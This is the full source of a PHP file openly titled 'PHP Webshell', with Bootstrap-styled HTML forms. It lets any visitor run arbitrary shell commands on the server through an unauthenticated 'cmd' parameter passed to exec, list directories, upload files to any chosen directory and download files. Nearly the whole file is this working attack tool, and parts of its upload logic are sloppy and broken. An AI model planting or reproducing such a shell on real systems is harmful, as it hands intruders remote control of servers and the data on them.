<html>
<!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">

<!-- jQuery library -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>

<!-- Latest compiled JavaScript -->
<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>

<div class="container">

<!DOCTYPE html>
<html>
<body>
<head>
<title> Webshell  </title>
<h2><b> PHP Webshell </b></h2>
<h3># Download File : </h3>
<a href="webshell.php?file=image.jpg">Click here</a>
</body>
</html>
 
<?php 
	/*if(!empty($_GET['file']))
	{
function downloadFiles($dir, $file) {
    header("Content-type: application/force-download");
    header('Content-Disposition: inline; filename="' . $dir . $file . '"');
    header("Content-Transfer-Encoding: Binary");
    header("Content-length: " . filesize($dir . $file));
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . $file . '"');
    readfile("$dir$file");
} 
 
//$dir = "folder_path";
 
$file = "image.jpg";
$download = downloadFiles($dir,$file);
	} */
 
 
	if(!empty($_GET['file']))
{
	$filename = basename($_GET['file']);
	$filepath = 'destination/' . $filename;
	if(!empty($filename) && file_exists($filepath)){
 
		header("Cache-Control: public"); //It always check for content update while reusing stored content
		header("Content-Description: FIle Transfer"); //
		header("Content-Disposition: attachment; filename=$filename");
		header("Content-Type: application/zip");
		header("Content-Transfer-Emcoding: binary");
 
		readfile($filepath);
		exit;
 
	}
	else{
		echo "This File Does not exist.";
	}
}
 
?>
 

 
<?php
$value="";
$filename="";
$fileTmpLoc="";
$fileName="";
 
$dir = $_GET['dir'];
if (isset($_POST['dir'])) {
	$dir = $_POST['dir'];
}
$file = '';
if ($dir == NULL or !is_dir($dir)) {
	if (is_file($dir)) {
		echo "enters";
		$file = $dir;
		echo $file;
	}
	$dir = './';
}
$dir = realpath($dir.'/'.$value);
// 
$dirs = scandir($dir);
echo "<h3># Viewing directory and Command execution : " . $dir . "</h3>";
echo "\n<br><form action='".$_SERVER['PHP_SELF']."' method='GET'>";
echo "<input type='hidden' name='dir' value=".$dir." />";
echo "<label style='color: teal;font-weight: 500;'><h4>Command Execution</h4></label><br><input type='text' placeholder='Enter the command...' name='cmd' style='width: 30%;
  padding: 12px 20px;
  margin: 8px 0;
  display: inline-block;
  border: 1px solid #ccc;
  border-radius: 4px;
  box-sizing: border-box;' >\n<input type='submit' value='Execute' style='width: 10%;
  justify-content: center;
  height: 46px;
  background-color: #4CAF50;
  color: white;
  padding: 10px 20px;
  margin: 8px 0;
  border: none;
  border-radius: 4px;
  cursor: pointer;'>\n";
echo "</form>";
echo "\n<br>\n<label style='color: teal;font-weight: 500;'><h4>File Upload</h4></label><br><div class='navbar-form'><form action='".$_SERVER['PHP_SELF']."' method='POST' enctype='multipart/form-data'>\n";
echo "<input type='hidden' name='dir' value='".$_GET['dir']."'/> ";
echo "<input type='file' name='fileToUpload' id='fileToUpload' class='file' style='background: teal;
  border: none;
  border-radius: 5px;
  color: #fff;
  height: 23.2px;
  width: 20%;
  cursor: pointer;
  display: flex;
  align-items: center;
  text-align: center;
  font-family: 'Rubik', sans-serif;
  font-size: inherit;
  font-weight: 500;
  margin-bottom: 1rem;
  outline: none;
  padding: 1rem 50px;
  position: relative;
  transition: all 0.3s;
  vertical-align: middle;'><p class='file-name' style='position: absolute;
  bottom: -35px;
  left: 10px;
  font-size: 0.85rem;
  color: #555;'><label for='fileToUpload' style=''><p class='file-name' style='position: absolute;
  bottom: -35px;
  left: 10px;
  font-size: 0.85rem;
  color: #555;'></p></label>\n<br><input type='submit' value='Upload File' name='submit' style='width: 10%;
  justify-content: center;
  height: 46px;
  background-color: #4CAF50;
  color: white;
  padding: 10px 20px;
  margin: 8px 0;
  border: none;
  border-radius: 4px;
  cursor: pointer;'>";
echo "<script>const file = document.querySelector('#file');
file.addEventListener('change', (e) => {
  const [file] = e.target.files;
  const { name: fileName, size } = file;
  const fileSize = (size / 1000).toFixed(2);
  const fileNameAndSize = `${fileName} - ${fileSize}KB`;
  document.querySelector('.file-name').textContent = fileNameAndSize;
});</script>";
echo "</div>";
 
if (isset($_POST['submit'])) {
	$uploadDirectory = $dir.'/'.basename($_FILES['fileToUpload']['name']);
	//checking if file exsists
	if(file_exists("documenti/$fileName")) { unlink("documenti/$fileName");
 
	//Place it into your "uploads" folder mow using the move_uploaded_file() function
	move_uploaded_file($fileTmpLoc, "documenti/$fileName");
	echo '<br><br><b>==>File uploaded successfully in </b><br>';
	}		
 
	//if (file_exists($uploadDirectory)) {
    //	echo "<br><br><b> Error. File already exists .</b></br></br>";
	//}
	else if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $uploadDirectory)) {
		echo '<br><br><b>File uploaded successfully in </b><br>';
	} else {
		echo '<br><br><b>Error uploading file '.$uploadDirectory.'</b><br><br>';
 
	}
 
}
 
if (isset($_GET['cmd'])) {
	echo "<br><br><b># Result of command execution is : </b><br>";
	exec('cd '.$dir.' && '.$_GET['cmd'], $cmdresult);
	foreach ($cmdresult as $key => $value) {
		echo " <ol align='left'> $value  </ol>";
	}
}
echo "<br><br>";
?>
</div>
</html>